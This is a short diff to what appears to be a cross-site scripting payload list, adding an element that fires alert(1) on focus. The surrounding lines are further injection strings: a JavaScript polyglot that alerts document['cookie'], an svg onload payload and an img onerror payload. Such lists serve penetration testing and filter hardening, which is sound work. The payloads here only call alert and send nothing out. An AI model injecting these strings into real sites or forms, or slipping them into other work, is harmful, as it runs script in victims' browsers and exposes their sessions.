@@ -35,6 +35,9 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(document['cookie']) )//%0D%0A
 \"-alert(1)}//
 
 
+<xss id=x tabindex=1 onfocus=alert(1)><
+
+
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3ea
 <><img src=1 onerror=alert(3)>
 
